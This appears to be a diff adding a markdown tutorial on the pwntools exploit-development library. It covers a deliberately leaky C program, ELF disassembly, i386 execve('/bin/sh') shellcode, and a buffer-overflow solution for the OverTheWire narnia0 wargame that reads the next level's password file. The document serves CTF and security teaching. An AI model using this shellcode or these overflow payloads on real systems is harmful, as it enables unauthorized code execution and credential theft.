@@ -1,0 +1,138 @@
+# pwntools - CTF toolkit
+
+From [1]:
+> Pwntools is a CTF framework and exploit development library. Written in Python, it is designed for rapid prototyping and development, and intended to make exploit writing as simple as possible.
+
+The following tutorials build from [4]:
+
+### Assembly and ELF manipulation
+
+For a simple code like:
+```C
+#include <stdio.h>
+
+int main(int argc, char* argv[])
+{
+	char flag[10] = {'S', 'E', 'C', 'R', 'E', 'T', 'F', 'L', 'A', 'G'};
+	char digits[10] = {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9'};
+	int index = 0;
+
+	while (1) {
+		printf("Give me an index and I'll tell you what's there!\n");
+		scanf("%d", &index);
+		printf("Okay, here you go: %p %c\n", &digits[index], digits[index]);
+	}
+	return 0;
+}
+```
+
+We compile it:
+```bash
+root@8beb97f8d305:/tutorial/tutorial6# gcc -o leaky leaky.c
+```
+
+and run the following Python script:
+```Python
+#!/usr/bin/env python
+from pwn import *
+
+leaky_elf = ELF('leaky')
+main_addr = leaky_elf.symbols['main']
+
+# Print address of main
+log.info("Main at: " + hex(main_addr))
+
+# Disassemble the first 14 bytes of main
+log.info(disasm(leaky_elf.read(main_addr, 14), arch='x86'))
+```
+
+Delivering:
+```
+root@8beb97f8d305:/tutorial/tutorial6# python example1.py
+[*] '/tutorial/tutorial6/leaky'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[*] Main at: 0x4005d6
+[*]    0:   55                      push   ebp
+       1:   48                      dec    eax
+       2:   89 e5                   mov    ebp,esp
+       4:   48                      dec    eax
+       5:   83 ec 50                sub    esp,0x50
+       8:   89 7d bc                mov    DWORD PTR [ebp-0x44],edi
+       b:   48                      dec    eax
+       c:   89                      .byte 0x89
+       d:   75                      .byte 0x75
+```
+
+### Shellcode from assembly
+Available in `example6.py`. Shortly:
+```Python
+#!/usr/bin/env python
+from pwn import *
+
+# Define the context of the working machine
+context(arch='i386', os='linux')
+
+# Get a simple shellcode
+log.info("Putting together simple shellcode")
+
+sh_shellcode2 = """
+        /* execve(path='/bin///sh', argv=['sh'], envp=0) */
+        /* push '/bin///sh\x00' */
+        push 0x68
+        push 0x732f2f2f
+        push 0x6e69622f
+        mov ebx, esp
+        /* push argument array ['sh\x00'] */
+        /* push 'sh\x00\x00' */
+        push 0x1010101
+        xor dword ptr [esp], 0x1016972
+        xor ecx, ecx
+        push ecx /* null terminate */
+        push 4
+        pop ecx
+        add ecx, esp
+        push ecx /* 'sh\x00' */
+        mov ecx, esp
+        xor edx, edx
+        /* call execve() */
+        push SYS_execve /* 0xb */
+        pop eax
+        int 0x80
+"""
+# Create a binary out of some shellcode
+e = ELF.from_assembly(sh_shellcode2, vma=0x400000, arch='i386')
+```
+
+### Shellcraft
+Only managed to make it work for 32-bit binaries. Refer to `example4.py` for a working example with 32-bits and to `example5.py` for a non-working example with 64-bits.
+
+
+
+### Examples
+#### narnia1
+As an example, provided the following problem http://overthewire.org/wargames/narnia/narnia1.html:
+
+```Python
+from pwn import *
+
+context(arch='i386', os='linux')
+s = ssh(user='narnia0', host='narnia.labs.overthewire.org', password='narnia0', port=2226)
+sh = s.run('/narnia/narnia0')
+sh.sendline('A'*20 + p32(0xdeadbeef))
+sh.sendline('cat /etc/narnia_pass/narnia1')
+while 1:
+    print(sh.recvline())
+# log.info('Flag: '+sh.recvline().split('\n')[0])
+s.close()
+
+```
+
+### Bibliography
+- [1] Gallopsled, *pwntools*. Retrieved from https://github.com/Gallopsled/pwntools.
+- [2] Gallopsled, *pwntools Docs*. Retrieved from https://docs.pwntools.com/en/stable/index.html.
+- [3] Exploit Database. Retrieved from https://www.exploit-db.com/.
+- [4] University Politehnica of Bucharest, Computer Science and Engineering Department, Computer and Network Security. *Lab 07 - Exploiting. Shellcodes (Part 2)*. Retrieved from https://ocw.cs.pub.ro/courses/cns/labs/lab-07.
